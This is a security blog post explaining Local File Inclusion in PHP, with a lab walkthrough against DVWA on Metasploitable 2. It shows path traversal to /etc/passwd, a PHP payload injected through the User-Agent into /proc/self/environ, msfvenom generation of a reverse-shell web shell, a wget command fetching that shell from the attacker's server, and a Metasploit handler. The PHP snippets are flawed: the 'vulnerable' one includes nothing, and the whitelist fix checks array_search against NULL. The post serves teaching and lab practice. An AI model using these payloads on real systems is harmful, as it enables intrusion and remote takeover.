---
published: true
---
---
title: "Local File Inclusion (LFI)"
date: 2022-12-10T15:34:30-08:00
categories:
  - blog
tags:
  - Linux
  - WebApp
  - RCE
---

# Introduction

It is possible for an application that does not adhere to the secure coding method to be vulnerable to Local File Inclusion (LFI). To put it simply, a web application is vulnerable when users upload or input data into files on the server. An attacker uses an inclusion attack to get a response from a web server by supplying valid input. This will allow the attacker to judge whether the input he supplied is valid. As long as it is valid, an attacker will have easy access to whatever file they wish to see.
LFI vulnerability can also lead to:

- Code execution on the client-side (leads to such as cross site scripting XSS)
- Remote code execution
- Denial of Service (DoS)

# Technical Details 

Sometimes, web applications are designed to request access to files on a system, including images, texts, and so on through using the parameters. Parameters are actually query parameter strings attached to the URL that are usually used for retrieving data or performing actions based on user input. Malicious user can manipulate the request parameter in the URL and try to access files or contents which were not suppose to be accessed by them.

Like many other vulnerabilities and exploitations, lack of security awareness among web application developers is the main reason behind LFI vulnerability. Considering PHP, using different functions such as require or include_once or include or require_once often lead to vulnerable web applications but this does not mean that LFI occurs merely in PHP web applications, conversely LFI vulnerabilities also happen in other languages. In order to clarify, here is a simple snippet of PHP code which is vulnerable to LFI.

```php
<?php

    $file = $_GET['page']; // Page we wish to display 
?>
```
Due to the fact that 90% of overall PHP-based sites operate on 5.2 PHP version or higher, where LFI occurs almost three times more frequently than RFI or any other exploitation. The `allow_url_include` switch in PHP version 5.2 offers hackers an additional control mechanism over remote files, which is the reason malicious users prefer LFI on websites which is running on PHP version 5.2 or higher. 

<div style="text-align:center">

<img src="/assets/images/0001_LFI_RFI_trend.png">

</div>

# LFI Vulnerabilities Identification
In most cases, LFI vulnerabilities can be easily identified and exploited. The following scripts can be further tested using LFI if they include any file from a remote web server:

`/sample-script.php?page=index.html` 

Using the file path  parameter, an attacker could exploit this vulnerability by:

`/sample-script-file.php?page= ../../../../../../../../../../../../etc/passwd`

Above is a typical method to have access to the details of the `/etc/passwd` file on a Linux or UNIX based operating system.

# How to protect applications from LFI vulnerabilities
Avoiding dynamically including files based on input from the user is the best way to get rid of Local File Inclusion (LFI) vulnerabilities.Otherwise, in order to limit the attacker's ability to control what gets included, the application should keep a whitelist of files that can be included.
In the following code block we can see that the get request will only process a set of specifically declared file names in the allowed file array. This is a good implementation of which can successfully protect websites from file inclusion attacks.


```php
$allowed_files = array('file1.php', 'file2.php');
$allowed_index = array_search($_GET['file'], $allowed_files)
if ($allowed_index !== NULL)
{
include $allowed_files[$allowed_index];
}
```
# LFI attack step-by-step instructions
## Requirements
### 1. DVWA on victim machine
Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application which is designed to be extremely vulnerable. It aims to help security professionals test their tools and skills in a legal environment. 

In our demonstration we used the Metasploitable 2 virtual machine. As this machine comes with DVWA pre-installed.
The Metasploitable 2 machine can be collected from the link below:
https://sourceforge.net/projects/metasploitable/files/


### 2. Kali Linux
When it comes to exploring vulnerabilities and penetration testing, Kali Linux is a Debian-based distribution of Linux designed specifically for these purposes. Kali Linux has various penetration-testing programs, including Nmap, Wireshark, Metasploit, Burp suite and, etc.

### 3. Burp Suite
Burp Suite is a graphical security testing tool for web applications . It helps mapping attack surface of an application and analyzing its vulnerabilities, it also has a number of features that work hand-in-hand together in order to support the entire testing process.

### 4. Metasploit Framework
The Metasploit Project is an exploit code testing platform that is built on Ruby. It allows security researchers to write, test, and execute exploit codes. A wide variety of exploits can be handled with the aid of this platform.

# Hacking Phase

We checked the connectivity between the Metasploitable 2 and Kali machine.
Here our Kali machine and Metasploitable 2 had IP 192.168.181.136 and 192.168.181.165 consecutively.

Now are going to follow these steps

### Step 1
 On our Kali Machine, run the Burp Suite and after visiting the proxy tab click on the ‘open browser’ button to start the Brup’s embedded browser and keep the intercept turned off. 
 
<div style="text-align:center">

<img src="/assets/images/0001_LFI_burp_p1.png">

</div>

### Step 2
 On the browser we visit the DVWA using the following URL `http://192.168.181.165/dvwa/`. After logging in DVWA with default credentials which is “admin” and “admin”,we  set the security level to low through clicking on the “DVWA security” button in the left of the main page.

<div style="text-align:center">

<img src="/assets/images/0001_LFI_DVWA_p1.png">

</div>

### Step 3
Visit the File inclusion vulnerability page using the following URL:
`http://192.168.181.165/dvwa/vulnerabilities/fi/?page=include.php`

<div style="text-align:center">

<img src="/assets/images/0001_LFI_DVWA_p2.png">

</div>

### Step 4
In order to check whether the DVWA is vulnerable to LFI, we add `page=../../../../../../../../etc/passwd` to the end of the File Inclusion page URL on DVWA. Below is the photo in which we could see an example of a successful exploitation of a Local File Inclusion vulnerability on DVWA.

<div style="text-align:center">

<img src="/assets/images/0001_LFI_DVWA_p3.png">

</div>

### Step 5 
Then we checked the HTTP history window in the Burp Suite where we could also see the content of the `/etc/passwd`.

<div style="text-align:center">

<img src="/assets/images/0001_LFI_burp_p2.png">

</div>

### Step 6
In this step we tried to check if the `proc/self/environ` method is exploitable on this version of DVWA. For that we needed to try with customizing the `User-Agent (HTTP_USER_AGENT)` value. To test that we used Burp’s repeater feature. 
We used our previously used request and sent it to the repeater tab.

<div style="text-align:center">

<img src="/assets/images/0001_LFI_burp_p3.png">

</div>

In the repeater tab we changed the file path to `../../../../../proc/self/environ` and checked the response with User-Agent value as `<?php phpinfo();?>`. A successful response would confirm to us that any php code we insert as User-Agent value would execute on the victim machine side and which also might help us to gain unauthorized access to the victim machine.

<div style="text-align:center">

<img src="/assets/images/0001_LFI_burp_p4.png">

</div>

As we found that it was giving us a successful response to PHP code, we move to the next step for creating a payload to upload onto the victim machine.

### Step 7
Here we generated a php web shell on Kali machine using the following command:

`msfvenom  -p  php/meterpreter/reverse_tcp  LHOST= Attacker’s IP address  LPORT=port > ~/backdoor.php`

In this tutorial our command would be like this:

`msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.181.136 LPORT=4444 > /home/ouser/backdoor.php` 

A web server was started on the same directory '/home/ouser/' after the webshell had been generated by making the following command in Python:

`python3 -m http.server 8000`

It would start a server on the attacker machine on port 8000.

### Step 8
In this step we tried to download the webshell file from the attacker machine onto the victim machine. For that we used the following php code.

`<?system('wget http://[attack machine]/reverseshell.txt -O root/directory/of/webapp/shell.php');?>`

As in our case, the attacker’s IP is “192.168.181.136” and the web shell is “backdoor.php” so the command would be as follows:

`<?system('wget http://192.168.181.136:8000/backdoor.php -O /var/www/dvwa/shell.php');?>`

<div style="text-align:center">

<img src="/assets/images/0001_LFI_burp_p5.png">

</div>

### Step 9

Now our webshell is uploaded to the victim machine and ready to trigger, and we need to perform the attack using metasploit on the Kali machine. To carry out the attack we first run msfconsole to enter the metasploit framework and then use the following command to set the exploit options:

```bash
> use exploit/multi/handler
> set payload php/meterpreter/reverse_tcp
> show options #set necessary options
> set LHOST Attacker_IP
> exploit #or 'run'
```
<div style="text-align:center">

<img src="/assets/images/0001_LFI_msf_p1.png">
</div>

Note that in this stage in order to accomplish the attack, we need to execute the shell by calling the URL where it was uploaded:

`http:// [Victim machine’s IP]/folder/shell.php`

<div style="text-align:center">

<img src="/assets/images/0001_LFI_burp_p6.png">

</div>

Finally, we have access to the victim machine through Meterpreter as you can see on the following screenshot.


<div style="text-align:center">

<img src="/assets/images/0001_LFI_msf_p2.png">

</div>



# Reference 

TryHackMe  Cyber Security Training.” TryHackMe, tryhackme.com, https://tryhackme.com/room/fileinc. Accessed 27 July 2022. 

“Local File Inclusion (LFI) Explained, Examples & How to Test.” Local File Inclusion (LFI) Explained, Examples & How to Test, www.aptive.co.uk, https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/. Accessed 27 July 2022.

“LFI Attack: Real Life Attacks and Attack Examples - Bright Security.” Bright Security, brightsec.com, 9 July 2021, https://brightsec.com/blog/lfi-attack-real-life-attacks-and-attack-examples/.

Chauhan, Bhagyeshwari. “LFI and RFI Attacks - All You Need to Know - Astra Security Blog.” Astra Security Blog, www.getastra.com, 10 Aug. 2020, https://www.getastra.com/blog/cms/your-guide-to-defending-against-lfi-and-rfi-attacks/.

Banach, Zbigniew. “What Is the Local File Inclusion (LFI) Vulnerability? Invicti.” Invicti, www.invicti.com, 10 May 2019, https://www.invicti.com/blog/web-security/local-file-inclusion-vulnerability/.
